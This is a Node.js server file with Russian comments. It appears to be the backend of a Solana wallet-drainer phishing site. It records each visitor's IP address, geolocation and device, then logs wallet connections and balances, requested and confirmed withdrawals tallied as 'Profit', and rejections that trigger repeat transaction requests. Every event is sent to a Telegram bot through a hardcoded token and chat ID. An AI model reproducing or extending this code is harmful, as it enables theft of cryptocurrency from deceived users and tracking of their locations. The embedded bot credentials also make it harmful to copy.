const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '7914629526:AAF-5bmzxtI_m6pcnpuFw0W83mcm12nCtv8';
const TELEGRAM_CHAT_ID = '-4767714458';

app.use(express.json());

// Middleware для получения IP-адреса и домена
app.use((req, res, next) => {
  req.clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  req.domain = req.headers['host'] || 'localhost';
  next();
});

// Функция для получения геоданных по IP
async function getGeoData(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const { country, city, countryCode } = response.data;
    const flagMap = {
      'RU': '🇷🇺', 'US': '🇺🇸', 'CN': '🇨🇳', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'JP': '🇯🇵',
    };
    const flag = flagMap[countryCode] || '🏳️';
    return {
      country: country || 'Неизвестно',
      city: city || 'Неизвестно',
      flag: flag,
    };
  } catch (error) {
    console.error('Ошибка получения геоданных:', error);
    return { country: 'Неизвестно', city: 'Неизвестно', flag: '🏳️' };
  }
}

// Функция для сокращения адреса кошелька или ID транзакции
function shortenAddress(address) {
  if (!address || address.length < 10) return address;
  return `${address.slice(0, 5)}...${address.slice(-4)}`;
}

// Эндпоинт для отправки сообщений в Telegram
app.post('/send-telegram', async (req, res) => {
  const ip = req.clientIp;
  const domain = req.domain;
  const geoData = await getGeoData(ip);
  const data = req.body;

  let message = '';

  switch (data.type) {
    case 'visit':
      message = `
🔔 Посещение сайта!

└ 🌍 IP: ${ip} (${geoData.country})
└ 📍 Гео: ${geoData.city}, ${geoData.country} (${geoData.flag})
└ 💻 Устройство: ${data.device}
└ 🌐 Домен: ${domain}
      `;
      break;
    case 'wallet_connected':
      const shortAddress = shortenAddress(data.address);
      message = `
🩸 Connect wallet: ${data.wallet}

└ 💳 Адрес: <a href="https://solscan.io/account/${data.address}">${shortAddress}</a>
└ 💲 Баланс: ${data.balance} SOL
      `;
      break;
    case 'transaction_requested':
      const shortAddressReq = shortenAddress(data.address);
      message = `
❓ Request trensaction

└ 💳 Адрес: <a href="https://solscan.io/account/${data.address}">${shortAddressReq}</a>
      `;
      break;
    case 'transaction_confirmed':
      const shortTxId = shortenAddress(data.txId); // Сокращаем ID транзакции
      message = `
💎 Aproove
└ 💰 Profit: ${data.amount} SOL
└ 📜 TxID: <a href="https://solscan.io/tx/${data.txId}">${shortTxId}</a>
      `;
      break;
    case 'transaction_rejected':
      message = `
Человек отклонил списание, запрашиваю повторную транзакцию
      `;
      break;
    case 'insufficient_funds':
      const shortAddressInsuf = shortenAddress(data.address);
      message = `
🙈 No fee

└ 💳 Адрес: <a href="https://solscan.io/account/${data.address}">${shortAddressInsuf}</a>
      `;
      break;
    default:
      message = 'Неизвестное событие';
  }

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message.trim(),
      parse_mode: 'HTML',
      disable_web_page_preview: true, // Отключаем превью для ссылок
    });
    res.status(200).send('Сообщение отправлено в Telegram');
  } catch (error) {
    console.error('Ошибка отправки в Telegram:', error);
    res.status(500).send('Ошибка отправки сообщения');
  }
});

// Статические файлы (index.html, settings.js)
app.use(express.static('public'));

app.listen(port, () => {
  console.log(`Сервер запущен на ${port}`);
});